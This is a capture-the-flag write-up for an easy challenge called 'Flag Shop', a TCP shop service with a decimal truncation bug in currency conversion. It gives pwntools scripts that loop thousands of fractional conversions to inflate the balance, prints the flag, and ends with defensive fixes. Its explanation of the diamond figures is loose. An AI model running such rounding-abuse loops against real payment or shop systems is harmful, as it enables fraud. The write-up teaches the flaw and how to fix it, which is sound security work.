---
layout: writeup
title: "Flag Shop"
challenge: "Flag Shop"
category: "Web"
difficulty: "Easy"
tags: [decimal-truncation, logic-bug, math-exploit, network-service]
---

# Challenge Overview

**Flag Shop** is an interactive network service (TCP) implementing a virtual shop where items can be bought and sold. The flag costs 10,000₹ but the starting balance is only 100₹. A **decimal truncation bug** in the currency conversion logic allows infinite money generation.

<div class="flag-box">KICTF{d3c1m4l_tr1m_byp4ss_ftw}</div>

---

## Initial Recon

```bash
$ nc 20.244.12.124 1234
```

The shop presents a menu:
- Buy items (bread, diamonds, etc.)
- Sell items
- Convert between currencies
- Buy flag (costs 10,000₹)
- Starting balance: 100₹

---

## Vulnerability / Weakness

**Decimal Truncation Logic Bug (CWE-681):** The shop truncates decimal values for display and balance calculations, but conversion between currencies uses floating-point arithmetic. Converting `0.999999` diamonds produces a credit of approximately 5₹ more than expected due to truncation asymmetry. The diamond balance displays `2.00` after the operation, while the actual deduction was less.

```
┌──────────────────────────────────────────────────┐
│           DECIMAL TRUNCATION EXPLOIT              │
├──────────────────────────────────────────────────┤
│                                                  │
│  1. Buy bread with starting ₹                    │
│  2. Sell bread → get diamonds                    │
│  3. Convert 0.999999 diamonds → ₹               │
│     ┌────────────────────────────────────┐       │
│     │ Display:  diamonds = 2.00          │       │
│     │ Actual:   diamonds = 1.000001      │       │
│     │ Credit:   ₹ += ~5.00 extra         │       │
│     └────────────────────────────────────┘       │
│  4. Repeat step 3 × ~2000 times                 │
│  5. Balance > 10,000₹                            │
│  6. Buy flag!                                    │
│                                                  │
└──────────────────────────────────────────────────┘
```

---

## Exploitation Strategy

1. Buy bread, sell for diamonds to get an initial diamond balance
2. Repeatedly convert `0.999999` diamonds to ₹, exploiting truncation
3. Accumulate balance above 10,000₹
4. Purchase the flag

---

## Exploitation Walkthrough

```python
from pwn import *

r = remote("20.244.12.124", 1234)

# Step 1: Buy bread
r.sendlineafter(b">", b"1")     # Buy
r.sendlineafter(b">", b"bread")

# Step 2: Sell bread for diamonds
r.sendlineafter(b">", b"2")     # Sell
r.sendlineafter(b">", b"bread")

# Step 3: Exploit truncation loop
for i in range(2500):
    r.sendlineafter(b">", b"3")          # Convert
    r.sendlineafter(b">", b"0.999999")   # Diamond amount
    
    if i % 500 == 0:
        r.sendlineafter(b">", b"4")      # Check balance
        print(r.recvline())

# Step 4: Buy the flag
r.sendlineafter(b">", b"5")   # Buy flag
print(r.recvline().decode())
# KICTF{d3c1m4l_tr1m_byp4ss_ftw}
```

---

## Flag Extraction

After approximately 2000 conversion iterations, balance exceeds 10,000₹:

```
Balance: 10,247.53₹
[+] Buying flag...
KICTF{d3c1m4l_tr1m_byp4ss_ftw}
```

---

## Proof of Concept

```python
#!/usr/bin/env python3
"""Flag Shop - Decimal Truncation Exploit"""

from pwn import *

r = remote("20.244.12.124", 1234)

# Initial setup: buy and sell to get diamonds
r.sendlineafter(b">", b"1")
r.sendlineafter(b">", b"bread")
r.sendlineafter(b">", b"2")
r.sendlineafter(b">", b"bread")

# Exploit truncation
for _ in range(2500):
    r.sendlineafter(b">", b"3")
    r.sendlineafter(b">", b"0.999999")

# Buy flag
r.sendlineafter(b">", b"5")
flag = r.recvline().decode().strip()
print(f"[+] {flag}")
r.close()
```

---

## Lessons Learned

- **Floating-point truncation** in financial calculations creates exploitable discrepancies. This mirrors real-world "salami slicing" attacks.
- **Display vs. actual values** can diverge when truncation is applied inconsistently between display rendering and balance tracking.
- Even small per-iteration gains compound across thousands of repetitions.

---

## Defensive Takeaways

| Vulnerability | Mitigation |
|---|---|
| Decimal truncation | Use integer arithmetic (cents/satoshis) for all financial calculations |
| Display/logic mismatch | Ensure display and computation use identical precision |
| Infinite loops | Rate-limit or cap transaction frequency per session |
